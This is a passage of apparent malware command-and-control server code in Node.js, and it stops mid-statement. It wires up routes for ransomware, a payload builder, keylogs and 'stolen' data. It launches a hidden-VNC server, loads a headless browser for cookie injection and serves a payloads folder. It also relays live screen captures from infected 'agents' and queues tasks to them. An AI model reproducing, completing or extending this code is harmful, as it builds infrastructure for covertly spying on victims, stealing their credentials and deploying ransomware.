const express = require('express');
const socketIO = require('socket.io');
const http = require('http');
const cors = require('cors');
const fetch = require('node-fetch');
const helmet = require('helmet');
const morgan = require('morgan');
const path = require('path');
const fs = require('fs');
const { spawn, exec } = require('child_process');
const net = require('net');
const util = require('util');
const execPromise = util.promisify(exec);
require('dotenv').config();
const { startCleanupJob } = require('./utils/cleanup');
require('./database');

// ─── RATE LIMITING ──────────────────────────────────────────────
const rateLimit = require('express-rate-limit');
const compression = require('compression');

// WebSocket server for WebRTC signaling (frontend) - separate port
const WebSocket = require('ws');
const webRTCServer = http.createServer();
const wss = new WebSocket.Server({ server: webRTCServer });

// TCP signaling server (for HVNC client)
const { startTcpSignaling } = require('../tcp-signaling');
const { verifyToken, requireAdmin } = require('./routes/auth');
// Import routes
const authRoutes = require('./routes/auth');
const agentRoutes = require('./routes/agents');
const taskRoutes = require('./routes/tasks');
const moduleRoutes = require('./routes/modules');
const ransomwareRoutes = require('./routes/ransomware');
const builderRoutes = require('./routes/builder');
const keylogsRoutes = require('./routes/keylogs');
const stolenRoutes = require('./routes/stolen');

// Multer for MJPEG relay (fallback)
const multer = require('multer');

// ─── PUPPETEER-CORE FOR COOKIE INJECTION ──────────────────────
let puppeteer;
try {
    puppeteer = require('puppeteer-core');
} catch (err) {
    console.warn('[INJECT] puppeteer-core not installed. Run: npm install puppeteer-core');
}

// ─── HVNC STATE STORE ──────────────────────────────────────────
const hvncFrames = new Map();    // agentId -> { frame, width, height, timestamp, sessionId }
const hvncViewers = new Map();   // agentId -> Set of viewer sockets



// ─── WEBRTC STATE STORE ──────────────────────────────────────────
const webrtcSessions = new Map();  // sessionId -> { agentId, pc, track, viewers, offer, answer }
const webrtcViewers = new Map();   // sessionId -> Set of viewer sockets

const crypto = require('crypto');
const TURN_SECRET = process.env.TURN_SECRET;

function turnCredentials(ttlSeconds = 86400) {
    const username = Math.floor(Date.now() / 1000) + ttlSeconds;
    const credential = crypto
        .createHmac('sha1', TURN_SECRET)
        .update(String(username))
        .digest('base64');
    return { username: String(username), credential };
}

// ─── WEBRTC SESSION MANAGEMENT ─────────────────────────────────
function createWebRTCSession(sessionId, agentId) {
    if (!webrtcSessions.has(sessionId)) {
        webrtcSessions.set(sessionId, {
            agentId: agentId,
            created: Date.now(),
            viewers: new Set(),
            offer: null,
            answer: null,
            iceCandidates: [],
            viewerIceCandidates: [],  // Add this line
            connected: false,
            hvnc: false  // Will be set when HVNC creates session
        });
        console.log(`[WebRTC] 📱 Session created: ${sessionId} for agent ${agentId}`);
    }
    return webrtcSessions.get(sessionId);
}
function getWebRTCSession(sessionId) {
    return webrtcSessions.get(sessionId);
}

function deleteWebRTCSession(sessionId) {
    const session = webrtcSessions.get(sessionId);
    if (session) {
        // Clean up viewers
        for (const viewer of session.viewers) {
            try {
                if (viewer.readyState === WebSocket.OPEN) {
                    viewer.close();
                }
            } catch (e) {}
        }
        webrtcSessions.delete(sessionId);
        console.log(`[WebRTC] 🗑️ Session deleted: ${sessionId}`);
    }
}

function addViewerToSession(sessionId, ws) {
    const session = webrtcSessions.get(sessionId);
    if (session) {
        session.viewers.add(ws);
        console.log(`[WebRTC] 👁️ Viewer added to session ${sessionId} (${session.viewers.size} viewers)`);
        return true;
    }
    return false;
}

function removeViewerFromSession(sessionId, ws) {
    const session = webrtcSessions.get(sessionId);
    if (session) {
        session.viewers.delete(ws);
        console.log(`[WebRTC] 👁️ Viewer removed from session ${sessionId} (${session.viewers.size} viewers)`);
        if (session.viewers.size === 0) {
            // Optionally cleanup session after no viewers
            // deleteWebRTCSession(sessionId);
        }
        return true;
    }
    return false;
}




// ─── HELPER: Find Chrome with remote debugging ──────────────────
async function findChromeDebugPort() {
    try {
        const { execSync } = require('child_process');
        for (let port = 9222; port <= 9322; port++) {
            try {
                const result = execSync(`netstat -ano | findstr ":${port}.*LISTENING"`, {
                    stdio: ['pipe', 'pipe', 'ignore'],
                    timeout: 2000
                });
                if (result && result.toString().trim()) {
                    const lines = result.toString().split('\n');
                    for (const line of lines) {
                        const parts = line.trim().split(/\s+/);
                        if (parts.length >= 5) {
                            const pid = parts[4];
                            if (pid && !isNaN(pid)) {
                                try {
                                    const taskList = execSync(`tasklist /FI "PID eq ${pid}" /FO CSV`, {
                                        stdio: ['pipe', 'pipe', 'ignore'],
                                        timeout: 2000
                                    });
                                    if (taskList && taskList.toString().toLowerCase().includes('chrome.exe')) {
                                        return port;
                                    }
                                } catch {}
                            }
                        }
                    }
                }
            } catch {}
        }
        return null;
    } catch {
        return null;
    }
}

// ------------------------------------------------------------
// RDP-LOCAL SERVER INTEGRATION
// ------------------------------------------------------------
let rdpProcess = null;

function isPortInUse(port) {
    return new Promise((resolve) => {
        const tester = net.createServer()
            .once('error', (err) => {
                if (err.code === 'EADDRINUSE') {
                    resolve(true);
                } else {
                    resolve(false);
                }
            })
            .once('listening', () => {
                tester.close();
                resolve(false);
            })
            .listen(port, '127.0.0.1');
    });
}

function killProcessOnPort(port) {
    return new Promise((resolve) => {
        try {
            const { execSync } = require('child_process');
            try {
                const result = execSync(
                    process.platform === 'win32'
                        ? `for /f "tokens=5" %a in ('netstat -ano ^| findstr :${port}') do taskkill /PID %a /F`
                        : `lsof -ti:${port} | xargs kill -9`,
                    { stdio: 'pipe', windowsHide: true }
                );
                console.log(`[Cleanup] Killed process on port ${port}`);
                resolve(true);
            } catch (e) {
                resolve(false);
            }
        } catch (e) {
            resolve(false);
        }
    });
}

function startRdpLocalServer() {
    const rdpPath = path.join(__dirname, '..', '..', 'tools', 'rdp-local');
    const rdpServer = path.join(rdpPath, 'server.js');
    if (!fs.existsSync(rdpServer)) {
        console.log('[RDP] ⚠️ rdp-local server not found at:', rdpServer);
        return null;
    }

    isPortInUse(9000).then((inUse) => {
        if (inUse) {
            console.log('[RDP] ℹ️ Port 9000 in use, killing existing process...');
            killProcessOnPort(9000).then(() => {
                setTimeout(() => {
                    startRdpServerProcess(rdpPath, rdpServer);
                }, 1000);
            });
            return;
        }
        startRdpServerProcess(rdpPath, rdpServer);
    });
    return null;
}

function startRdpServerProcess(rdpPath, rdpServer) {
    console.log('[RDP] 🚀 Starting rdp-local server on port 9000...');
    try {
        rdpProcess = spawn('node', [rdpServer], {
            cwd: rdpPath,
            detached: true,
            stdio: 'pipe',
            windowsHide: false
        });

        rdpProcess.stdout.on('data', (data) => {
            console.log(`[RDP] ${data.toString().trim()}`);
        });
        rdpProcess.stderr.on('data', (data) => {
            console.error(`[RDP] ${data.toString().trim()}`);
        });
        rdpProcess.on('error', (err) => {
            console.error(`[RDP] ❌ rdp-local error: ${err.message}`);
        });
        rdpProcess.on('exit', (code) => {
            console.log(`[RDP] ⛔ rdp-local server exited with code: ${code}`);
            rdpProcess = null;
        });
        rdpProcess.unref();
        console.log('[RDP] ✅ rdp-local server started on port 9000');
    } catch (error) {
        console.error(`[RDP] ❌ Failed to start rdp-local server: ${error.message}`);
    }
}

function stopRdpServer() {
    if (rdpProcess) {
        console.log('[RDP] 🛑 Stopping rdp-local server...');
        try {
            rdpProcess.kill();
        } catch (e) {
            console.error('[RDP] Error killing process:', e.message);
        }
        rdpProcess = null;
        console.log('[RDP] ✅ rdp-local server stopped');
    }
}

// ------------------------------------------------------------
// HVNC SERVER INTEGRATION (existing hvnc_server.exe)
// ------------------------------------------------------------
let hvncProcess = null;

function startHVNCServer() {
    const serverExe = path.join(__dirname, '..', '..', 'tools', 'hnvc', 'Server', 'hvnc_server.exe');
    const serverDir = path.dirname(serverExe);
    if (!fs.existsSync(serverExe)) {
        console.log('[HVNC] ⚠️ HVNC server not found at:', serverExe);
        return null;
    }

    console.log('[HVNC] 🚀 Starting HVNC server on port 1080...');

    try {
        hvncProcess = spawn(serverExe, ['1080'], {
            cwd: serverDir,
            detached: false,
            stdio: 'inherit',
            windowsHide: false
        });

        if (!hvncProcess) {
            console.error('[HVNC] ❌ Failed to spawn HVNC server process');
            return null;
        }

        hvncProcess.on('error', (err) => {
            console.error(`[HVNC] ❌ Process error: ${err.message}`);
            hvncProcess = null;
        });

        hvncProcess.on('exit', (code) => {
            console.log(`[HVNC] ⛔ Server exited with code: ${code}`);
            hvncProcess = null;
        });

        hvncProcess.unref();
        console.log(`[HVNC] ✅ Server process created with PID: ${hvncProcess.pid}`);
        return hvncProcess;
    } catch (error) {
        console.error(`[HVNC] ❌ Failed to start HVNC server: ${error.message}`);
        hvncProcess = null;
        return null;
    }
}

function stopHVNCServer() {
    if (hvncProcess) {
        console.log('[HVNC] 🛑 Stopping HVNC server...');
        try {
            hvncProcess.kill();
        } catch (e) {
            console.error('[HVNC] Error killing process:', e.message);
        }
        hvncProcess = null;
        console.log('[HVNC] ✅ Server stopped');
        return true;
    }
    console.log('[HVNC] ℹ️ No HVNC server running');
    return false;
}

// ------------------------------------------------------------
// CREATE APP
// ------------------------------------------------------------
const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
    cors: {
        origin: process.env.FRONTEND_URL || '*',
        methods: ['GET', 'POST']
    }
});

app.set('trust proxy', 1);

// ─── AUTO CLEANUP TASKS ──────────────────────────────────────
function cleanupTasks() {
    try {
        const db = require('./database');
        db.run(
            "DELETE FROM tasks WHERE status IN ('completed', 'failed', 'error') AND createdAt < datetime('now', '-1 hour')",
            function(err) {
                if (!err && this.changes > 0) {
                    console.log(`[CLEANUP] Deleted ${this.changes} old completed/failed tasks`);
                }
            }
        );
        db.run(
            "DELETE FROM tasks WHERE status = 'pending' AND createdAt < datetime('now', '-24 hours')",
            function(err) {
                if (!err && this.changes > 0) {
                    console.log(`[CLEANUP] Deleted ${this.changes} stuck pending tasks`);
                }
            }
        );
        db.run("VACUUM", function(err) {
            if (!err) {
                console.log(`[CLEANUP] Database vacuumed at ${new Date().toISOString()}`);
            }
        });
    } catch (err) {
        console.error(`[CLEANUP] Error: ${err.message}`);
    }
}

setInterval(cleanupTasks, 300000);
setTimeout(cleanupTasks, 5000);

// ─── RATE LIMITING ────────────────────────────────────────────
const agentLimiter = rateLimit({
    windowMs: 10000,
    max: 30,
    message: { error: 'Too many requests, please slow down' },
    skip: (req) => req.path === '/health'
});

app.use(compression());



// ------------------------------------------------------------
// WebRTC WebSocket server (on separate port 8082)
// ------------------------------------------------------------
// ─── WEBRTC WEBSOCKET SERVER (Enhanced) ──────────────────────────
wss.on('connection', (ws) => {
    console.log('[WebRTC] 🟢 Client connected');
    ws.isAlive = true;
    ws.sessionId = null;
    ws.role = null;

    ws.on('pong', () => {
        ws.isAlive = true;
    });

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            console.log('[WebRTC] 📨 Received:', data.type, 'from', data.sessionId || 'unknown');

            switch (data.type) {
                case 'viewer_connect':
                    // Viewer wants to connect to a session
                    const viewerSessionId = data.sessionId;
                    if (!viewerSessionId) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'Missing sessionId'
                        }));
                        return;
                    }
                    
                    const session = getWebRTCSession(viewerSessionId);
                    if (!session) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'Session not found or expired'
                        }));
                        return;
                    }
                    
                    ws.sessionId = viewerSessionId;
                    ws.role = 'viewer';
                    ws.session = session;
                    
                    // Add viewer to session
                    addViewerToSession(viewerSessionId, ws);
                    
                    // Send connection confirmed
                    ws.send(JSON.stringify({
                        type: 'viewer_connected',
                        sessionId: viewerSessionId,
                        agentId: session.agentId
                    }));
                    
                    console.log(`[WebRTC] 👁️ Viewer connected to session ${viewerSessionId}`);
                    
                    // If there's an offer waiting, send it now
                    if (session.offer) {
                        console.log(`[WebRTC] 📤 Sending queued offer to viewer ${viewerSessionId}`);
                        ws.send(JSON.stringify({
                            type: 'offer',
                            sdp: session.offer,
                            sessionId: viewerSessionId
                        }));
                    }
                    break;

                case 'agent_offer':
                    // Agent is sending an SDP offer
                    const agentSessionId = data.sessionId;
                    if (!agentSessionId) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'Missing sessionId'
                        }));
                        return;
                    }
                    
                    const agentSession = getWebRTCSession(agentSessionId);
                    if (!agentSession) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'Session not found'
                        }));
                        return;
                    }
                    
                    // Store the offer
                    agentSession.offer = data.sdp;
                    agentSession.connected = true;
                    ws.sessionId = agentSessionId;
                    ws.role = 'agent';
                    ws.session = agentSession;
                    
                    console.log(`[WebRTC] 📤 Agent offer received for session ${agentSessionId}`);
                    
                    // Forward offer to all connected viewers
                    let forwardedCount = 0;
                    for (const viewer of agentSession.viewers) {
                        if (viewer.readyState === WebSocket.OPEN) {
                            viewer.send(JSON.stringify({
                                type: 'offer',
                                sdp: data.sdp,
                                sessionId: agentSessionId
                            }));
                            forwardedCount++;
                        }
                    }
                    console.log(`[WebRTC] 📤 Offer forwarded to ${forwardedCount} viewers`);
                    
                    // If no viewers yet, store for later
                    if (forwardedCount === 0) {
                        console.log(`[WebRTC] 📦 No viewers yet, offer stored for session ${agentSessionId}`);
                    }
                    break;

                case 'viewer_answer':
                    // Viewer is sending an SDP answer
                    const answerSessionId = data.sessionId;
                    if (!answerSessionId) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'Missing sessionId'
                        }));
                        return;
                    }
                    
                    const answerSession = getWebRTCSession(answerSessionId);
                    if (!answerSession) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'Session not found'
                        }));
                        return;
                    }
                    
                    // Store the answer
                    answerSession.answer = data.sdp;
                    
                    console.log(`[WebRTC] 📤 Viewer answer received for session ${answerSessionId}`);
                    
                    // Forward answer to agent (only if agent is connected)
                    // In this architecture, we need to find the agent's WebSocket
                    // Since we don't have direct agent WS in this scope, we'll use HTTP to notify
                    // Or we can store and let agent poll
                    // For simplicity, we'll use the signaling server approach
                    
                    // Find the agent socket via the agentSockets map
                    const agentId = answerSession.agentId;
                    const agentSocket = getAgentSocket(agentId);
                    if (agentSocket && agentSocket.connected) {
                        agentSocket.emit('webrtc_answer', {
                            sessionId: answerSessionId,
                            sdp: data.sdp
                        });
                        console.log(`[WebRTC] 📤 Answer forwarded to agent ${agentId} via Socket.IO`);
                    } else {
                        console.log(`[WebRTC] ⚠️ Agent ${agentId} not connected via Socket.IO, storing answer`);
                        answerSession.pendingAnswer = data.sdp;
                    }
                    break;

                case 'ice_candidate':
    const iceSessionId = data.sessionId;
    const candidate = data.candidate;
    // If target is not provided, detect based on session type
    const iceSession = getWebRTCSession(iceSessionId);
    if (!iceSession) {
        ws.send(JSON.stringify({
            type: 'error',
            message: 'Session not found'
        }));
        return;
    }
    
    // Determine default target: HVNC sessions use 'agent', others use 'viewer'
    const isHvnc = iceSession.hvnc ? true : false;
    const target = data.target || (isHvnc ? 'agent' : 'viewer');
    
    if (!iceSessionId || !candidate) {
        ws.send(JSON.stringify({
            type: 'error',
            message: 'Missing sessionId or candidate'
        }));
        return;
    }
    
    console.log(`[WebRTC] 🧊 ICE candidate for session ${iceSessionId} -> ${target}`);
    
    if (target === 'viewer') {
        // Agent -> Viewer: forward to all viewers
        let viewerCount = 0;
        for (const viewer of iceSession.viewers) {
            if (viewer.readyState === WebSocket.OPEN) {
                viewer.send(JSON.stringify({
                    type: 'ice_candidate',
                    candidate: candidate,
                    sessionId: iceSessionId
                }));
                viewerCount++;
            }
        }
        console.log(`[WebRTC] 🧊 ICE candidate forwarded to ${viewerCount} viewers`);
    } else {
        // Viewer -> Agent: store in BOTH arrays so regular WebRTC and HVNC pollers get them
        if (!iceSession.viewerIceCandidates) iceSession.viewerIceCandidates = [];
        if (!iceSession.iceCandidates) iceSession.iceCandidates = [];
        iceSession.viewerIceCandidates.push(candidate);
        iceSession.iceCandidates.push({ candidate, timestamp: Date.now() });
        console.log(`[WebRTC] 📦 ICE candidate stored for agent (${iceSession.iceCandidates.length} total)`);
    }
    break;

                case 'disconnect':
                    // Client disconnecting
                    if (ws.sessionId) {
                        const session = getWebRTCSession(ws.sessionId);
                        if (session) {
                            if (ws.role === 'viewer') {
                                removeViewerFromSession(ws.sessionId, ws);
                            }
                        }
                    }
                    ws.send(JSON.stringify({
                        type: 'disconnected',
                        message: 'Disconnected from WebRTC signaling'
                    }));
                    ws.close();
                    break;

                default:
                    console.log('[WebRTC] ⚠️ Unknown message type:', data.type);
                    ws.send(JSON.stringify({
                        type: 'error',
                        message: `Unknown message type: ${data.type}`
                    }));
            }
        } catch (e) {
            console.error('[WebRTC] ❌ Error processing message:', e);
            ws.send(JSON.stringify({
                type: 'error',
                message: e.message
            }));
        }
    });

    ws.on('close', () => {
        console.log('[WebRTC] 🔴 Client disconnected', ws.sessionId || 'unknown');
        
        // Clean up session
        if (ws.sessionId) {
            if (ws.role === 'viewer') {
                removeViewerFromSession(ws.sessionId, ws);
            } else if (ws.role === 'agent') {
                // Agent disconnected, but keep session for reconnection
                const session = getWebRTCSession(ws.sessionId);
                if (session) {
                    session.connected = false;
                }
            }
        }
    });

    // Heartbeat
    const heartbeatInterval = setInterval(() => {
        if (ws.isAlive === false) {
            return ws.terminate();
        }
        ws.isAlive = false;
        ws.ping();
    }, 30000);

    ws.on('close', () => {
        clearInterval(heartbeatInterval);
    });
});

// ------------------------------------------------------------
// MIDDLEWARE
// ------------------------------------------------------------
app.use(helmet());
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));
app.use(morgan('combined'));

// Apply rate limiting to agent endpoints
app.use('/api/agents/heartbeat', agentLimiter);
app.use('/api/tasks/pending/*', agentLimiter);
// app.use('/api/modules/result', agentLimiter);


app.use((req, res, next) => {
  res.setHeader(
  'Content-Security-Policy',
  "default-src 'self'; " +
  "script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com; " +
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; " +
  "font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com; " +
  "img-src 'self' data: https:; " +
  "connect-src 'self' ws://driveone.online wss://driveone.online; " +
  "frame-src 'none'; " +
  "object-src 'none';"
);
  next();
});






// ─── WEBRTC HTTP ENDPOINTS FOR AGENT COMMUNICATION ──────────────

// Agent registers its WebRTC session (via HTTP)
app.post('/api/webrtc/agent/register', verifyToken, (req, res) => {
    const { agentId, sessionId } = req.body;
    
    if (!agentId || !sessionId) {
        return res.status(400).json({
            success: false,
            message: 'Missing agentId or sessionId'
        });
    }
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }
    
    if (session.agentId !== agentId) {
        return res.status(403).json({
            success: false,
            message: 'Agent ID mismatch'
        });
    }
    
    // Update session with agent info
    session.agentRegistered = true;
    session.lastAgentPing = Date.now();
    
    res.json({
        success: true,
        message: 'Agent registered for WebRTC session',
        sessionId: sessionId,
        viewers: session.viewers.size
    });
});

// Agent sends SDP offer via HTTP (alternative to WebSocket)
app.post('/api/webrtc/agent/offer', verifyToken, (req, res) => {
    const { sessionId, sdp } = req.body;
    
    if (!sessionId || !sdp) {
        return res.status(400).json({
            success: false,
            message: 'Missing sessionId or sdp'
        });
    }
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }
    
    // Store the offer
    session.offer = sdp;
    session.connected = true;
    
    // Forward to all connected viewers via WebSocket
    let forwardedCount = 0;
    for (const viewer of session.viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
            viewer.send(JSON.stringify({
                type: 'offer',
                sdp: sdp,
                sessionId: sessionId
            }));
            forwardedCount++;
        }
    }
    
    console.log(`[WebRTC] 📤 HTTP offer for session ${sessionId} forwarded to ${forwardedCount} viewers`);
    
    res.json({
        success: true,
        message: 'Offer received and forwarded',
        forwardedTo: forwardedCount,
        sessionId: sessionId
    });
});

// Get pending ICE candidates for agent
app.get('/api/webrtc/agent/candidates/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }

    const candidates = session.iceCandidates || [];
    const viewerCandidates = (session.viewerIceCandidates || []).map(c => ({ candidate: c, timestamp: Date.now() }));
    session.iceCandidates = [];
    session.viewerIceCandidates = [];

    res.json({
        success: true,
        candidates: [...candidates, ...viewerCandidates],
        count: candidates.length + viewerCandidates.length
    });
});


    
// Define rooms object for HVNC/TCP signaling
const rooms = {};

// Start TCP signaling server for HVNC client
// This handles the communication between HVNC client and WebRTC viewers
const { triggerViewerReady, forwardToHost } = startTcpSignaling(wss, rooms, 9001);

// Make these functions available globally in the WebRTC WebSocket handler
// They are used when an agent sends an offer or answer
global.triggerViewerReady = triggerViewerReady;
global.forwardToHost = forwardToHost;









// ─── SERVE STATIC FILES ─────────────────────────────────────
const staticPath = path.join(__dirname, 'build');
const mainPath = path.join(__dirname, 'main');

console.log(`📁 Serving main files from: ${mainPath}`);
app.use(express.static(mainPath));

console.log(`📁 Serving build files from: ${staticPath}`);
app.use('/login_090_srt', express.static(staticPath));

app.use('/assets', express.static(path.join(staticPath, 'assets')));
app.use('/static', express.static(path.join(staticPath, 'static')));
app.use('/css', express.static(path.join(staticPath, 'css')));
app.use('/js', express.static(path.join(staticPath, 'js'))); 

app.use('/payloads', express.static(path.join(__dirname, 'payloads')));
app.set('io', io);

// ─── MJPEG RELAY (OPTIMIZED) ──────────────────────────────────
const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: 10 * 1024 * 1024 }
});

// ─── MJPEG STATE STORE ──────────────────────────────────────────
const mjpegState = {
    frame: null,
    lastUpdate: 0,
    frameCount: 0,
    totalFrames: 0,
    quality: 40,
    fps: 0,
    optimized: true,
    _fpsCounter: 0,
    _fpsTimer: Date.now()
};

// ─── BROADCASTER CLIENTS ──────────────────────────────────────
let broadcastClients = new Map();
let broadcastInterval = null;
let broadcastFrameCounter = 0;


// ─── MJPEG UPLOAD ──────────────────────────────────────────────
app.post('/api/mjpeg/upload', upload.single('frame'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).send('No frame uploaded');
        }
        
        const imgBuffer = req.file.buffer;
        const frameCount = parseInt(req.headers['x-frame-count']) || 0;
        const isOptimized = req.headers['x-optimized'] === 'true';
        
        // Store frame
        mjpegState.frame = imgBuffer;
        mjpegState.lastUpdate = Date.now();
        mjpegState.totalFrames++;
        mjpegState.optimized = isOptimized;
        
        // ─── FPS CALCULATION ──────────────────────────────────────────
        mjpegState._fpsCounter++;
        const elapsed = (Date.now() - mjpegState._fpsTimer) / 1000;
        if (elapsed >= 1) {
            mjpegState.fps = Math.round(mjpegState._fpsCounter / elapsed);
            mjpegState._fpsCounter = 0;
            mjpegState._fpsTimer = Date.now();
        }
        // ──────────────────────────────────────────────────────────────
        
        if (mjpegState.totalFrames % 30 === 0) {
            console.log(`[MJPEG] 📸 Frame ${mjpegState.totalFrames} uploaded | FPS: ${mjpegState.fps} | Optimized: ${isOptimized}`);
        }
        
        res.status(200).send('OK');
    } catch (err) {
        console.error('[MJPEG] Upload error:', err.message);
        res.status(500).send('Error');
    }
});


// ─── OPTIMIZED STREAM ENDPOINT (SINGLE BROADCASTER) ────────────
app.get('/api/mjpeg/stream', (req, res) => {
    if (!mjpegState.frame) {
        return res.status(404).send('No frames available');
    }

    const clientId = req.query.clientId || Date.now() + '_' + Math.random().toString(36).substr(2, 6);
    
    console.log(`[MJPEG] 📺 Stream connected - client: ${clientId}`);

    // Set up response headers
    const boundary = 'frame';
    res.writeHead(200, {
        'Content-Type': `multipart/x-mixed-replace; boundary=${boundary}`,
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'Connection': 'keep-alive',
        'Access-Control-Allow-Origin': '*'
    });

    // Send initial frame
    sendFrameToClient(res, mjpegState.frame);

    // Add to broadcast list
    broadcastClients.set(clientId, { 
        res: res, 
        connected: true,
        lastFrameTime: Date.now()
    });

    // Start broadcaster if not running
    if (!broadcastInterval) {
        console.log('[MJPEG] 🚀 Starting broadcaster');
        broadcastInterval = setInterval(() => {
            broadcastFrame();
        }, 33); // ~30 FPS max
    }

    // Handle client disconnect
    req.on('close', () => {
        broadcastClients.delete(clientId);
        console.log(`[MJPEG] 📺 Stream disconnected - client: ${clientId}, remaining: ${broadcastClients.size}`);
        
        if (broadcastClients.size === 0 && broadcastInterval) {
            console.log('[MJPEG] 🛑 No clients, stopping broadcaster');
            clearInterval(broadcastInterval);
            broadcastInterval = null;
        }
    });
});

function broadcastFrame() {
    const frame = mjpegState.frame;
    if (!frame) return;
    
    broadcastFrameCounter++;
    
    const boundary = 'frame';
    const header = `--${boundary}\r\n` +
                   `Content-Type: image/jpeg\r\n` +
                   `Content-Length: ${frame.length}\r\n\r\n`;
    
    const fullChunk = Buffer.concat([
        Buffer.from(header),
        frame,
        Buffer.from('\r\n')
    ]);
    
    const clientsToRemove = [];
    
    for (const [id, client] of broadcastClients) {
        if (!client.connected) {
            clientsToRemove.push(id);
            continue;
        }
        
        try {
            client.res.write(fullChunk);
            client.lastFrameTime = Date.now();
        } catch (err) {
            client.connected = false;
            clientsToRemove.push(id);
        }
    }
    
    // Clean up dead clients
    for (const id of clientsToRemove) {
        broadcastClients.delete(id);
    }
}

function sendFrameToClient(res, frame) {
    const boundary = 'frame';
    try {
        res.write(`--${boundary}\r\n`);
        res.write('Content-Type: image/jpeg\r\n');
        res.write(`Content-Length: ${frame.length}\r\n\r\n`);
        res.write(frame);
        res.write('\r\n');
    } catch (err) {
        // Client disconnected
        throw err;
    }
}

// ─── STATUS ENDPOINT ──────────────────────────────────────────
app.get('/api/mjpeg/status', (req, res) => {
    const isActive = mjpegState.frame !== null && 
                     (Date.now() - mjpegState.lastUpdate < 5000);
    
    res.json({
        running: isActive,
        lastUpdate: mjpegState.lastUpdate,
        totalFrames: mjpegState.totalFrames || 0,
        fps: mjpegState.fps || 0, 
        hasFrame: mjpegState.frame !== null,
        frameSize: mjpegState.frame ? mjpegState.frame.length : 0,
        optimized: mjpegState.optimized || false,
        clients: broadcastClients.size,
        activeCodec: 'mjpeg',
        timestamp: Date.now()
    });
});

// ─── MJPEG KILLSWITCH ──────────────────────────────────────────
app.post('/api/mjpeg/killall', (req, res) => {
    console.log('[MJPEG] KILLALL called - stopping all streams');
    
    // ─── Clear state ──────────────────────────────────────────────
    mjpegState.frame = null;
    mjpegState.lastUpdate = 0;
    mjpegState.totalFrames = 0;
    mjpegState.frameCount = 0;
    mjpegState.fps = 0;
    
    // ─── Disconnect all clients ──────────────────────────────────
    for (const [id, client] of broadcastClients) {
        try {
            if (client.res && !client.res.finished) {
                client.res.end();
            }
        } catch (err) {
            // Ignore
        }
    }
    broadcastClients.clear();
    
    if (broadcastInterval) {
        clearInterval(broadcastInterval);
        broadcastInterval = null;
    }
    
    console.log('[MJPEG] ✅ All streams killed');
    
    // ─── Send kill command to all agents via task ──────────────
    const db = require('./database');
    db.all("SELECT agentId FROM agents WHERE status = 'active'", (err, rows) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        
        let tasksCreated = 0;
        const taskId = Date.now() + '_' + Math.random().toString(36).substr(2, 6);
        
        rows.forEach(row => {
            const agentId = row.agentId;
            db.run(
                "INSERT INTO tasks (taskId, agentId, type, moduleName, moduleAction, status) VALUES (?, ?, ?, ?, ?, ?)",
                [taskId + '_' + agentId, agentId, 'module_action', 'mjpeg', 'stop_host', 'pending'],
                (err) => {
                    if (!err) tasksCreated++;
                }
            );
        });
        
        res.json({
            status: 'success',
            message: 'All streams killed',
            agents: rows.length,
            tasksCreated: tasksCreated,
            clientsKilled: broadcastClients.size
        });
    });
});



// Agent polls for the viewer's SDP answer
app.get('/api/webrtc/agent/answer/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }
    // If answer exists, return it and clear it (so subsequent polls get nothing)
    if (session.pendingAnswer) {
        const answer = session.pendingAnswer;
        session.pendingAnswer = null; // clear after delivery
        return res.json({ success: true, sdp: answer });
    }
    // Also check if answer is stored in session.answer (if already set via WebSocket)
    if (session.answer) {
        const answer = session.answer;
        session.answer = null;
        return res.json({ success: true, sdp: answer });
    }
    // No answer yet
    res.json({ success: false, message: 'No answer yet' });
});



// ─── KILL ALL WEBRTC STREAMS ──────────────────────────────────
app.post('/api/webrtc/killall', (req, res) => {
    console.log('[WebRTC] 💀 KILLALL called - terminating all streams');
    let killed = 0;
    for (const [sessionId, session] of webrtcSessions) {
        // Close all viewer WebSockets
        for (const viewer of session.viewers) {
            try {
                if (viewer.readyState === WebSocket.OPEN) {
                    viewer.close(1000, 'Killswitch activated');
                }
            } catch (e) {}
        }
        // Close PeerConnection if it exists (on agent side, we can't directly close)
        // We'll rely on the agent to clean up when it receives a stop_host task
        // Or we can send a task to each agent to stop WebRTC
        killed++;
        deleteWebRTCSession(sessionId);
    }
    // Also clear any leftover state
    webrtcSessions.clear();
    webrtcViewers.clear();
    console.log(`[WebRTC] ✅ Killed ${killed} streams`);
    res.json({ 
        success: true, 
        killed: killed,
        message: `Terminated ${killed} WebRTC session(s)`
    });
});



// Optionally send stop_host task to all agents
app.post('/api/webrtc/stop-agents', verifyToken, (req, res) => {
    const db = require('./database');
    db.all("SELECT agentId FROM agents WHERE status = 'active'", (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        let tasksCreated = 0;
        const taskId = Date.now() + '_kill';
        rows.forEach(row => {
            db.run(
                "INSERT INTO tasks (taskId, agentId, type, moduleName, moduleAction, status) VALUES (?, ?, ?, ?, ?, ?)",
